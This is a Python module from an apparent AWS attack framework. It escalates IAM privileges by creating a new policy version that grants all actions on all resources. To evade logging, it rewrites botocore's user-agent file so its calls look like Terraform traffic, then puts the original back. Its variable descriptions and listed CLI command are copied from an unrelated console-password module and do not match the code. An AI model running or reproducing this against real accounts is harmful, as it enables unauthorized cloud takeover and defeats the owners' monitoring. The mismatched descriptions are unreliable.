import os.path
import sys

from termcolor import colored
from datetime import datetime
import json
from pydoc import pipepager

from core.createSession.giveMeClient import giveMeClient

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "iam",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "POLICY-ARN": {
        "value": "",
        "required": "true",
        "description": "The user to allow access to the Management Console. Either use this ot"
    },
    "POLICY-PATH": {
        "value": "/",
        "required": "true",
        "description": "The file of all the users to allow access to the Management Console."
    },
    "POLICY-DOCUMENT": {
        "value": '{"Version": "2012-10-17", "Statement": [{"Sid": "VisualEditor0", "Effect": "Allow", "Action": "*", "Resource": "*"}]}',
        "required": "true",
        "description": "The password to give to the user. The password needs to be compatible with the password policy configured. Use enum/aws_iam_get_account_password_policy to check it."
    }
}
description = "If an IAM user is not allowed to access the Management Console, you can allow it using a password you want."

aws_command = "aws iam create-login-profile --user-name <user> --password <password> <--password-reset-required OR --no-password-reset-required> --region <region> --profile <profile>"

def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
    policy_arn = variables['POLICY-ARN']['value']
    policy_path = variables['POLICY-PATH']['value']
    policy_document = variables['POLICY-DOCUMENT']['value']
    currentua = None
    try:
        if os.path.exists(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent"):
            with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "r") as uafile:
                currentua = uafile.read().replace("\n", "").strip()

        with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
            uafile.write(
                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/sts#1.30.1"
            )

        stsprofile = giveMeClient(
            all_sessions=all_sessions,
            cred_prof=cred_prof,
            useragent=useragent,
            web_proxies=web_proxies,
            service="sts"
        )
        stsprofile.get_caller_identity()

        with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
            uafile.write(
                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/iam#1.30.1"
            )

        iamprofile = giveMeClient(
            all_sessions=all_sessions,
            cred_prof=cred_prof,
            useragent=useragent,
            web_proxies=web_proxies,
            service="iam"
        )
        policyresponse = iamprofile.create_policy_version(
            PolicyArn=policy_arn,
            #PolicyPath=policy_path,
            PolicyDocument=policy_document
        )

        with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
            uafile.write(
                "APN/1.0 HashiCorp/1.0 Terraform/1.8.5 (+https://www.terraform.io) terraform-provider-aws/5.57.0 (+https://registry.terraform.io/providers/hashicorp/aws) aws-sdk-go-v2/1.30.1 os/linux lang/go#1.22.4 md/GOOS#linux md/GOARCH#amd64 api/sts#1.30.1"
            )

        stsprofile = giveMeClient(
            all_sessions=all_sessions,
            cred_prof=cred_prof,
            useragent=useragent,
            web_proxies=web_proxies,
            service="sts"
        )
        stsprofile.get_caller_identity()
        if currentua is not None:
            with open(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent", "w") as uafile:
                uafile.write(currentua)
        else:
            os.remove(f"{sys.prefix}/lib/python3.10/site-packages/botocore/.user-agent")

        return {
            "Status": f"Successfully Created Version {policyresponse['PolicyVersion']['VersionId']} for Policy {policy_arn}"
        }
    except:
        return {
            "error": f"Error Creating Version for Policy {policy_arn}: {str(sys.exc_info())}"
        }